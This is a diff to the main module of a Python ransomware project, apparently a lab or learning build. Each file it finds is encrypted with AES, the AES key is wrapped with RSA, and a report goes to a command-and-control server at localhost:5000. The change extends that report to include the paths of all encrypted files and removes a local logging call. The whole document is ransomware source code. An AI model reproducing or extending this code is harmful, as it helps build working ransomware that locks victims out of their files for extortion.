@@ -7,7 +7,6 @@ from ransomware.config import TARGET_EXTENSION, TARGET_PATHS, PUBLIC_KEY_FILE
 from ransomware.file_walker import find_files
 from ransomware.encryptor import encrypt_file
 from ransomware.rsa_keys import encrypt_key, generate_keys
-from ransomware.logger import log_encrypted
 
 generate_keys()
 
@@ -16,11 +15,12 @@ def load_public_key():
     with open(PUBLIC_KEY_FILE, 'rb') as f:
         return f.read()
 
-def reports_to_c2(encrypted_aes_key, num_files):
+def reports_to_c2(encrypted_aes_key, num_files, encrypted_files_paths):
     try:
         response = requests.post("http://localhost:5000/report", json={
-            "aes_key": encrypted_aes_key.decode(),
-            "files_encrypted": num_files
+            "encrypted_aes_key": encrypted_aes_key.decode(),
+            "num_of_encrypted_files": num_files,
+            "encrypted_files_paths" : encrypted_files_paths
         })
         # print("[+] Report sent to C2:", response.text) #just for testing
     except Exception as e:
@@ -35,10 +35,9 @@ def main():
     
     for file_path in files:
         encrypt_file(file_path, aes_key)
-        log_encrypted(file_path)
 
     # Report to Flask C2
-    reports_to_c2(encrypted_aes_key, len(files))
+    reports_to_c2(encrypted_aes_key, len(files), files)
 
 if __name__ == '__main__':
     main()
